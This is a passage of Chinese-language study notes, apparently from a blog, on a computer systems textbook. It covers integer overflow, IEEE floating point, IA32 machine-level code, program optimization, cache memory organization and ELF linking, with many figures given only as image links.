的两个数x,y;且在系统中为补码表示，<br>如果：      -2<sup>(w-1)&lt;=x+y&lt;2</sup>(w-1) 则结果正常</p><p>x+y&lt;-2<sup>(w-1)</sup>发生负溢出 结果为x+y+2<sup>w</sup><br>x+y&gt;=2<sup>(w-1)</sup>发生正溢出 结果为x+y-2<sup>w</sup></p><p>推导过程:<br>对于一个w位，他所能表达值得范围：</p><p>比如 w=4:           0 0 0 0        最大值 0 1 1 1=7  (2^(4-1)-1)<br>最小值 1 0 0 0=-8  (-2^(4-1) )</p><p>超出这个范围将发生溢出，截断溢出位：</p><p>负溢出+2^w<br>正溢出-2^w<br><img src="/posts/e0eae192/image-20210414173419106.png" alt="image-20210414173419106"></p><h3 id="条件码相关知识"><a class="markdownIt-Anchor" href="#条件码相关知识"></a> 条件码相关知识</h3><p><img src="/posts/e0eae192/image-20210315200213357.png" alt="image-20210315200213357"></p><h2 id="第三章-位字节和信息存储"><a class="markdownIt-Anchor" href="#第三章-位字节和信息存储"></a> 第三章 位字节和信息存储</h2><h3 id="信息的位与表示"><a class="markdownIt-Anchor" href="#信息的位与表示"></a> 信息的位与表示</h3><ul><li><strong>典型数据类型的长度</strong></li></ul><p><img src="/posts/e0eae192/image-20210414182913863.png" alt></p><ul><li><p><strong>字节顺序</strong></p><p><img src="/posts/e0eae192/image-20210414175028953.png" alt="image-20210414175028953"></p></li></ul><h3 id="整数"><a class="markdownIt-Anchor" href="#整数"></a> 整数</h3><p><img src="/posts/e0eae192/image-20210414180814272.png" alt></p><h3 id="浮点数"><a class="markdownIt-Anchor" href="#浮点数"></a> 浮点数</h3><h4 id="ieee浮点数标准"><a class="markdownIt-Anchor" href="#ieee浮点数标准"></a> IEEE<strong>浮点数标准</strong></h4><p><img src="/posts/e0eae192/image-20210414181040336.png" alt="image-20210414181040336"></p><p><img src="/posts/e0eae192/image-20210414181054897.png" alt="image-20210414181054897"></p><blockquote><p><strong>规格化值</strong></p></blockquote><p><img src="/posts/e0eae192/image-20210414181116849.png" alt="image-20210414181116849"></p><p><img src="/posts/e0eae192/image-20210414181322258.png" alt="image-20210414181322258"></p><blockquote><p><strong>非规格化值</strong></p></blockquote><p><img src="/posts/e0eae192/image-20210414181242656.png" alt="image-20210414181242656"></p><blockquote><p><strong>特殊值</strong></p></blockquote><p><img src="/posts/e0eae192/image-20210414181430845.png" alt="image-20210414181430845"></p><p><img src="/posts/e0eae192/image-20210621222546804.png" alt="image-20210621222546804"></p><h4 id="舍入和运算"><a class="markdownIt-Anchor" href="#舍入和运算"></a> <strong>舍入和运算</strong></h4><blockquote><p><strong>浮点数舍入规则</strong></p></blockquote><p>如果以形式1.RR…RDD…D表示浮点数（R表示有效位，或保留位，而D表示舍去位），舍入规则就是：</p><p>如果DD…D &lt; 10…0，则向下舍入</p><p>如果DD…D &gt; 10…0，则向上舍入</p><p>如要DD…D = 10…0，则向最近偶数舍入，细则如下 ：</p><p>a. 如果RR…R = XX…0 （最低有效位是0），则向下舍入</p><p>b. 如果RR…R = XX…1（最低有效位是1），则向上舍入</p><blockquote><p><strong>浮点数运算</strong></p></blockquote><p><img src="/posts/e0eae192/image-20210414182405160.png" alt="image-20210414182405160"></p><p><img src="/posts/e0eae192/image-20210414182418619.png" alt="image-20210414182418619"></p><h2 id="第四章-程序的机器级表示"><a class="markdownIt-Anchor" href="#第四章-程序的机器级表示"></a> 第四章  程序的机器级表示</h2><h3 id="基本"><a class="markdownIt-Anchor" href="#基本"></a> 基本</h3><h4 id="ia32寄存器"><a class="markdownIt-Anchor" href="#ia32寄存器"></a> IA32寄存器</h4><p><img src="/posts/e0eae192/image-20210414184335897.png" alt="image-20210414184335897"></p><h4 id="算术操作"><a class="markdownIt-Anchor" href="#算术操作"></a> 算术操作</h4><p><img src="/posts/e0eae192/image-20210414184419105.png" alt="image-20210414184419105"></p><p><img src="/posts/e0eae192/image-20210414184428359.png" alt="image-20210414184428359"></p><p><img src="/posts/e0eae192/image-20210414184615336.png" alt="image-20210414184615336"></p><h3 id="控制"><a class="markdownIt-Anchor" href="#控制"></a> 控制</h3><p><img src="/posts/e0eae192/image-20210414185557502.png" alt="image-20210414185557502"></p><h4 id="条件码设置"><a class="markdownIt-Anchor" href="#条件码设置"></a> 条件码设置</h4><p><img src="/posts/e0eae192/image-20210414185743149.png" alt="image-20210414185743149"></p><p><img src="/posts/e0eae192/image-20210414185759630.png" alt="image-20210414185759630"></p><p><img src="/posts/e0eae192/image-20210414185811106.png" alt="image-20210414185811106"></p><p><img src="/posts/e0eae192/image-20210414185821323.png" alt="image-20210414185821323"></p><h3 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h3><h4 id="栈帧"><a class="markdownIt-Anchor" href="#栈帧"></a> 栈帧</h4><p><img src="/posts/e0eae192/image-20210416102006727.png" alt="image-20210416102006727"></p><blockquote><p><strong>call指令</strong></p></blockquote><ol><li><p>把下一条指令地址压栈b</p></li><li><p>再把调用的函数地址给eip</p></li></ol><blockquote><p><strong>leave指令</strong></p></blockquote><ol><li>movl %ebp %esp  将esp回到上一个过程的栈顶位置，即ebp的地址</li><li>popl %ebp              将旧的ebp地址返回ebp</li></ol><blockquote><p><strong>ret</strong></p></blockquote><p>pop %eip  将下一条指令地址给%eip</p><h3 id="复杂数据的机器级表示"><a class="markdownIt-Anchor" href="#复杂数据的机器级表示"></a> 复杂数据的机器级表示</h3><h2 id="第五章-优化程序性能"><a class="markdownIt-Anchor" href="#第五章-优化程序性能"></a> 第五章 优化程序性能</h2><h3 id="编译器的局限"><a class="markdownIt-Anchor" href="#编译器的局限"></a> 编译器的局限</h3><ul><li><p>妨碍优化的因素</p><ol><li><p>存储器的别名使用</p><p><strong>存储器别名使用</strong>是指两个指针可能同时指向同一个存储器的位置的情况。在只考虑执行安全的优化中，编译器必须假设不同的指针可能会指向存储器的同一个位置，这造成了<strong>第一个妨碍优化的因素</strong>，这也是可能严重限制编译器产生优化代码机会的程序的一个方面。如果编译器不能确定指针的指向，它就会假设所有的情况都有可能，所以我们需要做的就是在<strong>编写程序的时候明确指针的指向</strong>。</p></li><li><p>函数调用</p><p><strong>函数调用</strong>是<strong>第二个妨碍优化的因素</strong>。尽可能减少函数的调用可以优化程序，但是编译器会假设最糟糕的情况，并<strong>保持所有的函数调用不变</strong>。所以，我们需要在<strong>编写程序的时候将函数调用的次数尽可能减少</strong>，这件事情只能coder来做，编译器为了安全是不会去做的。</p></li></ol></li></ul><h3 id="表示程序性能"><a class="markdownIt-Anchor" href="#表示程序性能"></a> 表示程序性能</h3><ul><li><p>用<strong>每元素的周期数</strong>（Cycles Per Element ，<strong>CPE</strong>）作为<strong>程序性能的度量标准</strong>。它的计算过程是：先得到函数的元素个数和周期的散点图，后经过<strong>最小二乘方拟合</strong>得到折线图，其中<strong>折线的斜率</strong>表明<strong>每元素的周期数CPE</strong>。</p></li><li><p>**运行时间：**一个元素完成功能所运行的时间</p></li><li><p><strong>周期数每元素(Cycles Per Element, CPE )</strong> ：运行时间/时钟周期</p></li><li><p>**时间周期：**CPU完成一个基本动作的时间（对应一个电平信号宽度）</p></li><li><p>一个时钟周期是多长时间呢？<br>通常当一个标有“4GHz”的处理器，表示处理器每秒运行4X10^9个时钟周期，一个时钟周<br>期的时长是时钟频率的倒数，为0.25X10^{-9}秒=0.25纳秒（250皮秒）<br>Hz， KHz， MHz, GHz<br>秒， 毫秒， 微秒，纳秒</p></li></ul><h3 id="不依赖于机器特性的优化"><a class="markdownIt-Anchor" href="#不依赖于机器特性的优化"></a> 不依赖于机器特性的优化</h3><h4 id="1-消除循环的低效率"><a class="markdownIt-Anchor" href="#1-消除循环的低效率"></a> 1. 消除循环的低效率</h4><p><img src="/posts/e0eae192/image-20210608153952303.png" alt="image-20210608153952303"></p><p>这个优化是一类常见的优化的一个例子，称为<strong>代码移动( code motion</strong>)。这类优化包括识别要执行多次（例如在循环里）但是计算结果不会改变的计算。因而可以将计算移动到代码前面不会被多次求值的部分。</p><h4 id="2-减少过程调用"><a class="markdownIt-Anchor" href="#2-减少过程调用"></a> 2. 减少过程调用</h4><p><img src="/posts/e0eae192/image-20210609142759377.png" alt="image-20210609142759377"></p><h4 id="3-消除不必要的存储器引用"><a class="markdownIt-Anchor" href="#3-消除不必要的存储器引用"></a> 3. 消除不必要的存储器引用</h4><p><img src="/posts/e0eae192/image-20210609143101235.png" alt="image-20210609143101235"></p><h3 id="理解现代处理器"><a class="markdownIt-Anchor" href="#理解现代处理器"></a> 理解现代处理器</h3><h4 id="功能单元的性能"><a class="markdownIt-Anchor" href="#功能单元的性能"></a> 功能单元的性能</h4><p><img src="/posts/e0eae192/image-20210609162108070.png" alt="image-20210609162108070"></p><p><img src="/posts/e0eae192/image-20210609162041644.png" alt="image-20210609162041644"></p><ul><li><strong>延迟</strong>：完成运算所需要的总时间</li><li><strong>发射时间</strong>：表示两个连续的同类型的运算之间所需要的最小时钟周期数</li><li><strong>最大吞吐量</strong>：发射时间的倒数</li><li><strong>廷迟界限</strong>：给出了任何必须按照严格顺序完成合并运算的函数所需要的最小CPE值。</li><li><strong>吞吐量界限</strong>：根据功能单元产生结果的最大速率，吞吐量界限给出了CPE的最小界限。</li></ul><h4 id="处理器操作的抽象模型"><a class="markdownIt-Anchor" href="#处理器操作的抽象模型"></a> 处理器操作的抽象模型</h4><h5 id="1从机器级代码到数据流图"><a class="markdownIt-Anchor" href="#1从机器级代码到数据流图"></a> 1.从机器级代码到数据流图</h5><p><img src="/posts/e0eae192/image-20210609162352543.png" alt="image-20210609162352543"></p><p><img src="/posts/e0eae192/image-20210609162425613.png" alt="image-20210609162425613"></p><p><img src="/posts/e0eae192/image-20210609162517278.png" alt="image-20210609162517278"></p><p>图中的链是限制性能的关键路径</p><h5 id="2其他性能因素"><a class="markdownIt-Anchor" href="#2其他性能因素"></a> 2.其他性能因素</h5><ul><li>数据流表示的的<strong>关键路径</strong>提供的只是<strong>程序需要周期数的下界</strong>，还有其他一些因素会限制性能，包括<br><strong>可用的功能单元的数量</strong>和<strong>任何一步中功能单元之间能够传递数据值的数量</strong>。</li></ul><h3 id="基于机器特性的优化"><a class="markdownIt-Anchor" href="#基于机器特性的优化"></a> 基于机器特性的优化</h3><h4 id="1循环展开"><a class="markdownIt-Anchor" href="#1循环展开"></a> 1.循环展开</h4><p><strong>循环展开</strong>是一种程序变换，通过增加每次迭代计算的元素的数量，减少循环的迭代次数。</p><p>循环展开能够从<strong>两个方面</strong>改程序的性能：</p><ul><li><p>首先，它减少了不直接有助于程序结果的操作的数量，例如循环索引计算和条件分支。</p></li><li><p>其次，它提供了ー些方法，可以进一步变化代码，减少整个计算中关键路径上的操作数量。在本节中，我们会看一些简单的循环展开，不做任何进一步的变化</p></li></ul><p>循环展开示例：<img src="/posts/e0eae192/image-20210609163517926.png" alt="image-20210609163517926"></p><p><img src="/posts/e0eae192/image-20210609163640228.png" alt="image-20210609163640228"></p><p><img src="/posts/e0eae192/image-20210619165210954.png" alt="image-20210619165210954"></p><p>循环展开可以提高整数加法和乘法的性能，因为GCC会对整数乘法做重关联变换，但不会改变浮点加法和乘法做做这种变化，所以性能并没有提升</p><h4 id="2提高并行性"><a class="markdownIt-Anchor" href="#2提高并行性"></a> 2.提高并行性</h4><h5 id="1-多个累计变量"><a class="markdownIt-Anchor" href="#1-多个累计变量"></a> 1) 多个累计变量</h5><p><img src="/posts/e0eae192/image-20210609164539108.png" alt="image-20210609164539108"></p><p><img src="/posts/e0eae192/image-20210609164604747.png" alt="image-20210609164604747"></p><p><img src="/posts/e0eae192/image-20210619165230377.png" alt="image-20210619165230377"></p><h5 id="2-重新结合变换"><a class="markdownIt-Anchor" href="#2-重新结合变换"></a> 2) 重新结合变换</h5><p>改变合并顺序：</p><p><img src="/posts/e0eae192/image-20210609164646452.png" alt="image-20210609164646452"></p><p><img src="/posts/e0eae192/image-20210609164734377.png" alt="image-20210609164734377"></p><p><img src="/posts/e0eae192/image-20210609164801356.png" alt="image-20210609164801356"></p><p><img src="/posts/e0eae192/image-20210619165247136.png" alt="image-20210619165247136"></p><h3 id="一些限制因素"><a class="markdownIt-Anchor" href="#一些限制因素"></a> 一些限制因素</h3><ol><li>寄存器溢出</li><li>分支预测和预测错误处罚</li></ol><h3 id="理解存储器的性能"><a class="markdownIt-Anchor" href="#理解存储器的性能"></a> 理解存储器的性能</h3><h4 id="加载的性能"><a class="markdownIt-Anchor" href="#加载的性能"></a> 加载的性能</h4><p><img src="/posts/e0eae192/image-20210609171007080.png" alt="image-20210609171007080"></p><h4 id="存储的性能"><a class="markdownIt-Anchor" href="#存储的性能"></a> 存储的性能</h4><h3 id="优化程序性能的基本策略"><a class="markdownIt-Anchor" href="#优化程序性能的基本策略"></a> 优化程序性能的基本策略</h3><p><strong>1)高级设计</strong></p><p>为遇到的问题选择适当的算法和数据结构。要特别警觉，避免使用那些会渐进地产生糟糕性能的算法或编码技术。<br><strong>2)基本编码原则</strong></p><p>避免限制优化的因素，这样编译器就能产生高效的代码。</p><ul><li>消除连续的函数调用。在可能时，将计算移到循环外。考虑有选择地妥协程序的模块性以<br>获得更大的效率。</li><li>消除不必要的存储器引用。引人临时变量来保存中间结果。只有在最后的值计算出来时，<br>才将结果存放到数组或全局变量中。</li></ul><p><strong>3)低级优化</strong></p><ul><li>展开循环，降低开销，并且使得进一步的优化成为可能。</li><li>通过使用例如多个累积变量和重新结合等技术，找到方法提高指令级并行。</li><li>用功能的风格重写条件操作，使得编译采用条件数据传送。</li></ul><p><strong>Amdahl定律</strong></p><p><img src="/posts/e0eae192/image-20210609171724722.png" alt="image-20210609171724722"></p><h2 id="第六章-存储器体系结构"><a class="markdownIt-Anchor" href="#第六章-存储器体系结构"></a> 第六章 存储器体系结构</h2><h3 id="61-存储技术"><a class="markdownIt-Anchor" href="#61-存储技术"></a> 6.1 存储技术</h3><h4 id="11-随机访问存储器"><a class="markdownIt-Anchor" href="#11-随机访问存储器"></a> 1.1 随机访问存储器</h4><p>分为静态的(SRAM)和动态的(DRAM)</p><p><img src="/posts/e0eae192/image-20210614140955548.png" alt="image-20210614140955548"></p><p><strong>传统的DRAM</strong></p><p><img src="/posts/e0eae192/image-20210614141026087.png" alt="image-20210614141026087"></p><p><strong>存储器模块</strong></p><p><img src="/posts/e0eae192/image-20210614141219177.png" alt="image-20210614141219177"></p><h4 id="12-磁盘存储"><a class="markdownIt-Anchor" href="#12-磁盘存储"></a> 1.2 磁盘存储</h4><p>磁盘是广为应用的保存大量数据的存储设备，存储数据的数量级可以达到几百到几千千兆字节，而基于RAM的存储器只能有几百或几千兆字节。不过，从磁盘上读信息的时间为毫秒级，从DRAM读比从磁盘读快10万倍，从SRAM读比从磁盘读快100万倍。</p><p><strong>磁盘容量计算</strong></p><p><img src="/posts/e0eae192/image-20210614141419194.png" alt="image-20210614141419194"></p><p><strong>磁盘操作</strong></p><p>磁盘以扇区大小的块来读写数据。对扇区的访问时间有三个主要的部分：寻道时间、旋转时间、传送时间。</p><p><img src="/posts/e0eae192/image-20210614141748772.png" alt="image-20210614141748772"></p><p><img src="/posts/e0eae192/image-20210614141816855.png" alt="image-20210614141816855"></p><p>因为寻道时间和旋转延迟大致是相等的，所以将寻道时间乘2是估计磁盘访问时间的简单而合理的办法。</p><h4 id="13-固态硬盘"><a class="markdownIt-Anchor" href="#13-固态硬盘"></a> 1.3 固态硬盘</h4><p><img src="/posts/e0eae192/image-20210614162059129.png" alt="image-20210614162059129"></p><h3 id="62-局部性"><a class="markdownIt-Anchor" href="#62-局部性"></a> 6.2 局部性</h3><h4 id="局部性原理"><a class="markdownIt-Anchor" href="#局部性原理"></a> 局部性原理</h4><p>一个编写良好的计算机程序常常具有良好的局部性，它们倾向于引用邻近于其他最近引用过的数据项的数据项，或者最近引用过的数据项本身，这种倾向性，被称为局部性原理。</p><h4 id="量化评价局部性的简单原则"><a class="markdownIt-Anchor" href="#量化评价局部性的简单原则"></a> <strong>量化评价局部性的简单原则</strong></h4><ul><li>重复引用同一个变量的程序有良好的时间局部性。</li><li>对于具有步长为k的引用模式的程序，步长越小，空间局部性越好。具有步长为1的引用模式的程序有很好的空间局部性。在存储器中以大步长跳来跳去的程序空间局部性会很差。</li><li>对于取指令来说，循环有好的时间和空间局部性。循环体越小，循环迭代次数越多，局部性越好。</li></ul><h3 id="63-存储器层次结构"><a class="markdownIt-Anchor" href="#63-存储器层次结构"></a> 6.3 存储器层次结构</h3><p><img src="/posts/e0eae192/image-20210614144247180.png" alt="image-20210614144247180"></p><h4 id="存储器层次结构中的缓存"><a class="markdownIt-Anchor" href="#存储器层次结构中的缓存"></a> 存储器层次结构中的缓存</h4><p><strong>存储器层次结构的中心思想</strong></p><p>对于每个k,位于k层的更快更小的存储设备作为位于k+1层的更大更慢的存储设备的缓存。换句话说，层次结构中的每一层都缓存来自较低一层的数据对象。例如，本地磁盘作为通过网络从远程磁盘取出的文件(例如Web页面)的缓存，主存作为本地磁盘上数据的缓存，依此类推，直到最小的缓存CPU寄存器集合。</p><p><strong>缓存命中</strong></p><p>当程序需要第k+1层的某个数据对象d时，它首先在当前存储在第k层的一个块中査找d。如果d刚好缓存在第k层中，那么就是我们所说的<strong>缓存命中</strong>( cache hit)。</p><p><strong>缓存不命中</strong></p><p>另ー方面，如果第k层中没有缓存数据对象d,那么就是我们所说的<strong>缓存不命中</strong>（ cache miss).当发生缓存不命中时，第k层的缓存从第k+1层缓存中取出包含d的那个块，如果第k层的缓存已经满了的话，可能就会覆盖现存的一个块。</p><p>覆盖一个现存的块的过程称为<strong>替换</strong>( replacing)或<strong>驱逐</strong>( evicting)这个块。被驱逐的这个块有时也称为<strong>牺牲块</strong>( victim block)。决定该替换哪个块是由缓存的<strong>替换策略</strong>(replacement policy)来控制的。例如，一个具有随机替换策略的缓存会随机选择一个牺性块。一个具有最近最少被使用(LRU)替换策略的缓存会选择那个最后被访问的时间距现在最远的块。</p><p><strong>缓存不命中的种类</strong></p><ul><li><p>冷不命中</p><p>如果第k层的缓存是空的，那么对任何数据对象的访问都会不命中。一个空的缓存有时称为冷缓存( cold cache)，此类不命中称为<strong>强制性不命中</strong>或<strong>冷不命中</strong></p></li><li><p>冲突不命中</p><p>在这种情况下，缓存足够大，能够保存被引用的数据对象，但是因为这些对象会映射到同一个缓存块，缓存会一直不命中。</p><p>例如，如果程序请求块0,然后块8,然后块0,然后块8,依此类推，在第k层的缓存中，对这两个块的每次引用都会不命中，即使是这个缓存总共可以容纳4个块。</p></li><li><p>容量不命中</p><p>当工作集的大小超过缓存的大小时，缓存会经历<strong>容量不命中</strong>( capacity miss)。换句话说，缓存就是太小了，不能处理这个工作集。</p></li></ul><h3 id="64-高速缓存存储器"><a class="markdownIt-Anchor" href="#64-高速缓存存储器"></a> 6.4 高速缓存存储器</h3><h4 id="41-通用的高速缓存存储器结构"><a class="markdownIt-Anchor" href="#41-通用的高速缓存存储器结构"></a> 4.1 通用的高速缓存存储器结构</h4><p>考虑一个计算机系统，其中每个存储器地址有m位，形成M=2<sup>m</sup>个不同的地址。如图6-27a所示。</p><p>这样一个机器的高速缓存被组织成一个有S=2<sup>s</sup>个<strong>高速缓存组</strong>的数组。</p><p>每个组包含E个<strong>高速缓存行</strong>( cache line)。</p><p>每个行是由一个B=2<sup>b</sup>字节的<strong>数据块</strong>( block)组成的，一个<br>有效位( valid bit)指明这个行是否包含有意义的信息，还有t=m-(b+s)个标记位(是当前块的存储器地址的位的一个子集），它们唯一地标识存储在这个高速缓存行中的块。</p><p><img src="/posts/e0eae192/image-20210614150943188.png" alt="image-20210614150943188"></p><p><strong>高速缓存的大小</strong>：C=S×E×B</p><p><img src="/posts/e0eae192/image-20210614152049400.png" alt="image-20210614152049400"></p><h4 id="42-直接映射高速缓存"><a class="markdownIt-Anchor" href="#42-直接映射高速缓存"></a> 4.2 直接映射高速缓存</h4><p>根据E（每个组的高速缓存行数）高速缓存被分为不同的类。每个组只有一行(E=1)的高速缓存称为<strong>直接映射高速缓存</strong></p><p><img src="/posts/e0eae192/image-20210614152338888.png" alt="image-20210614152338888"></p><p><strong>1.直接映射高速缓存的组选择</strong></p><p>在这一步中，高速缓存从w的地址中间抽取出s个组索引位。这些位被解释成一个对应于个组号的无符号整数。换句话来说，如果我们把高速缓存看成是一个关于组的一维数组，那么这些组索引位就是一个到这个数组的索引。</p><p><img src="/posts/e0eae192/image-20210614152556380.png" alt="image-20210614152556380"></p><p><strong>2.直接映射高速缓存的行匹配</strong></p><p>当且仅当设置了有效位，而且高速缓存行中的标记与w的地址中的标记相匹配时，这一行中包含w的一个拷贝。</p><p><strong>3.直接映射高速缓存的字选择</strong></p><p>如图6-31所示，块偏移位提供了所需要的字的第一个字节的偏移。就像我们把高速缓存看成一个行的数组一样，我们把块看成一个字节的数组，而字节偏移是到这个数组的一个索引。在这个示例中，块偏移位是100<sub>2</sub>,它表明w的拷贝是从块中的字节4开始的（我们假设字长为4字节）。</p><p><img src="/posts/e0eae192/image-20210614152831935.png" alt="image-20210614152831935"></p><p><strong>4.直接映射高速缓存中不命中时的行替换</strong></p><p>如果缓存不命中，那么它需要从存储器层次结构中的下一层取出被请求的块，然后将新的块存储在组索引位指示的组中的一个高速缓存行中。一般而言，如果组中都是有效高速缓存行了，那么必须要驱逐出一个现存的行。对于直接映射高速缓存来说，每个组只包含有一行，替换策略非常简单：<strong>用新取出的行替换当前的行</strong>。</p><ul><li>用中间位做索引高速缓存的使用效率更高。</li></ul><h4 id="43-组相连高速缓存"><a class="markdownIt-Anchor" href="#43-组相连高速缓存"></a> 4.3 组相连高速缓存</h4><p><strong>1.组相联高速缓存中的组选择</strong><br>它的组选择与直接映射高速缓存的组选择一样，组索引位标识组。</p><p><img src="/posts/e0eae192/image-20210614160744314.png" alt="image-20210614160744314"></p><p><strong>2.组相联高速缓存中的行匹配和字选择</strong></p><p>图6-36展示了相联高速缓存中行匹配的基本思想。这里的一个重要思想就是组中的任何行都可以包含任何映射到这个组的存储器块。所以高速缓存必须<strong>捜索组中的每一行</strong>，寻找一个有效的行，其标记与地址中的标记相匹配。如果高速缓存找到了这样一行，那么我们就命中，块偏移从这个块中选择一个字，和前面一样。</p><p><img src="/posts/e0eae192/image-20210614160949149.png" alt="image-20210614160949149"></p><p><strong>3.组相联高速缓存中不命中时的行替换</strong></p><p>有空行选择空行。</p><p>最简单的替换策略是<strong>随机选择要替换的</strong>行。</p><p><strong>最不常使用</strong>( Least-frequently-Used,LFU)策略会替换在<br>过去某个时间窗口内引用次数最少的那一行。</p><p><strong>最近最少使用</strong>( Least- Recently-Used,LRU)策略会替换最后一次访问时间最久远的那一行。所有这些策略都需要额外的时间和硬件。</p><h4 id="44-全相连高速缓存"><a class="markdownIt-Anchor" href="#44-全相连高速缓存"></a> 4.4 全相连高速缓存</h4><p><img src="/posts/e0eae192/image-20210614161050792.png" alt="image-20210614161050792"></p><p><strong>1.全相联高速缓存中的组选择</strong></p><p><img src="/posts/e0eae192/image-20210614161201608.png" alt="image-20210614161201608"></p><p><strong>2.全相联高速缓存中的行匹配和字选择</strong></p><p>全相联高速缓存中的行匹配和字选择与组相联高速缓存中的是一样的，如图6-39所示。它们之间的区别主要是个规模大小的问题。因为高速缓存电路必须并行地捜索许多相匹配的标记，造一个又大又快的相联高速缓存很困难，而且很昂贵。因此，全相联高速缓存只适合做小的高速缓存，例如虚拟存储器系统中的翻译备用缓冲器(TLB),它缓存页表项。</p><p><img src="/posts/e0eae192/image-20210614161349454.png" alt="image-20210614161349454"></p><h4 id="45-有关写的问题"><a class="markdownIt-Anchor" href="#45-有关写的问题"></a> 4.5 有关写的问题</h4><p>**第一个问题：**在高速缓存更新了它的w的拷贝之后，怎么更新w在层次结构中紧接着低一层中的拷贝？</p><ul><li><p><strong>直写</strong></p><p>就是立即将w的高速缓存块写回到紧接着的低一层中。虽然简单，但是直写的缺点是每次写都会引起总线流量。</p></li><li><p><strong>写回</strong></p><p>尽可能地推迟存储器更新，只有当替换算法要驱逐更新过的块时，才把它写到紧接着的低一层中。由于局部性，写回能显著地减少总线流量，但是它的缺点是增加了复杂性。高速缓存必须为每个高速缓存行维护一个额外的修改位( dirty bit),表明这个高速缓存块是否被修改过。</p></li></ul><p>**第二个问题：**如何处理写不命中</p><ul><li><p><strong>写分配</strong></p><p>加载相应的低一层中的块到高速缓存中，然后更新这个高速缓存块。写分配试图利用写的空间局部性，但是缺点是每次不命中都会导致一个块从低一层传送到高速缓存。</p></li><li><p><strong>非写分配</strong></p><p>避开高速缓存，直接把这个字写到低一层中。</p></li></ul><p>直写高速缓存通常是非写分配的。写回高速缓存通常是写分配的。</p><h4 id="46一个真实的高速缓存层次结构的解剖"><a class="markdownIt-Anchor" href="#46一个真实的高速缓存层次结构的解剖"></a> 4.6一个真实的高速缓存层次结构的解剖</h4><p><img src="/posts/e0eae192/image-20210614163042361.png" alt="image-20210614163042361"></p><h4 id="47-高速缓存参数的性能影响"><a class="markdownIt-Anchor" href="#47-高速缓存参数的性能影响"></a> 4.7 <strong>高速缓存参数的性能影响</strong></h4><p><strong>衡量高速缓存的性能指标</strong></p><ul><li><p><strong>不命中率</strong></p><p>不命中数量/引用数量</p></li><li><p><strong>命中率</strong></p><p>命中率=1-不命中率</p></li><li><p><strong>命中时间</strong></p><p>从高速缓存传送一个字到CPU所需的时间，包括组选择、行确认和字选择的时间。</p></li><li><p><strong>不命中处罚</strong></p><p>由于不命中所需要的额外的时间。</p></li></ul><p><strong>1.高速缓存大小的影响</strong></p><p><strong>2.块大小的影响</strong></p><p><strong>3.相联度的影响</strong></p><p><strong>4.写策略的影响</strong></p><h2 id="第七章-链接"><a class="markdownIt-Anchor" href="#第七章-链接"></a> 第七章 链接</h2><h3 id="71-编译器驱动程序"><a class="markdownIt-Anchor" href="#71-编译器驱动程序"></a> 7.1 编译器驱动程序</h3><p>大多数编译系统提供<strong>编译驱动桯序</strong>( compiler driver),它代表用户在需要时调用语言预处理器、编译器、汇编器和链接器。</p><hr><h3 id="72-静态链接"><a class="markdownIt-Anchor" href="#72-静态链接"></a> 7.2 静态链接</h3><p>像Unix ld程序这样的<strong>静态链接器</strong>以一组可重定位目标文件和命令行参数作为输人，生成一个完全链接的可以加载和运行的可执行目标文件作为输出。</p><p>输入的<strong>可重定位目标文件</strong>由各种不同的代码和数据节(section)组成。指令在一个节中，初始化的全局变量在另一个节中，而未初始化的变量又在另外一个节中。</p><p><strong>链接器主要任务：</strong></p><ul><li><strong>符号解析</strong>( symbol resolution)。目标文件定义和引用符号。符号解析的目的是将每个符号<br>引用刚好和一个符号定义联系起来。</li><li><strong>重定位</strong>( relocation)。编译器和汇编器生成从地址0开始的代码和数据节。链接器通过把<br>每个符号定义与一个存储器位置联系起来，然后修改所有对这些符号的引用，使得它们指<br>向这个存储器位置，从而重定位这些节。</li></ul><hr><h3 id="73-目标文件"><a class="markdownIt-Anchor" href="#73-目标文件"></a> 7.3 目标文件</h3><p>目标文件三种形式：</p><ul><li><strong>可重定位目标文件</strong>。包含二进制代码和数据。其形式可以在编译时与其他可重定位目标文件合并起来，创建一个可执行文件。</li><li><strong>可执行目标文件</strong>。包含二进制代码和数据。可被直接拷贝到存储器执行。</li><li><strong>共享目标文件</strong>。一种特殊的可重定位目标文件。可以在加载时或者在运行时被动态地加载到存储器并链接。</li></ul><p>编译器和汇编器生成可重定位目标文件（包括共享目标文件）。</p><p>链接器生成可执行目标文件。</p><hr><h3 id="74-可重定位目标文件"><a class="markdownIt-Anchor" href="#74-可重定位目标文件"></a> 7.4 可重定位目标文件</h3><p><img src="/posts/e0eae192/image-20210614174042988.png" alt="image-20210614174042988"></p><ul><li><p><strong>ELF头</strong></p><ul><li><p>以一个<strong>16字节的序列</strong>开始，这个序列描述了<strong>生成该文件的系统的字的大小和字节顺序</strong>。</p></li><li><p>ELF头剩下的部分包含帮助链接器语法分析和解释目标文件的信息。</p><p>其中包括：</p><ul><li><p>ELF头的大小。</p></li><li><p>目标文件的类型（如可重定位、可执行或者是共享的）</p></li><li><p>机器类型（IA32）</p></li><li><p>节头部表的文件偏移</p></li><li><p>节头部表中的条目大小和数量。</p></li></ul></li></ul></li><li><p>夹在ELF头和节头部表之间的都是<strong>节</strong>。一个典型的ELF可重定位目标文件包含下面几个节：</p><ul><li>**.text：**已编译程序的机器代码。</li><li>**.rodata：**只读数据。比如printf语句中的格式串和switch语句的跳转表。</li><li>**.data：**已初始化的全局C变量。局部C变量在运行时保存在栈中，既不出现在.data节中，也不出现在.bss节中。</li><li>**.bss：**未初始化的全局C变量。在目标文件中，未初始化变量不需要占据任何实际的磁盘空间，仅仅是为了空间效率的占位符。</li><li>**.symtab：**一个符号表，它存放在程序中定义和引用的函数和全局变量的信息。</li><li>**.rel.text：**一个.text节中位置的列表，在与其他可重定位目标文件结合时需要修改这些位置。</li><li>**.rel.data：**被模块引用或定义的任何全局变量的重定位信息。</li><li><strong>.debug：<strong>一个调试符号表。包括局部变量、全局变量以及原始的C源文件。只有用</strong><code>-g</code>选项</strong>才会得到这张表。</li><li><strong>.line：<strong>原始C源程序中的行号和.text节中机器指令之间的映射。只有用</strong><code>-g</code>选项</strong>才会得到这张表。</li><li>**.strtab：**一个字符串表，其内容包括.symtab和.debug节中的符号表，以及节头部中的节名字。</li></ul></li></ul><hr><h3 id="75-符号和符号表"><a class="markdownIt-Anchor" href="#75-符号和符号表"></a> 7.5 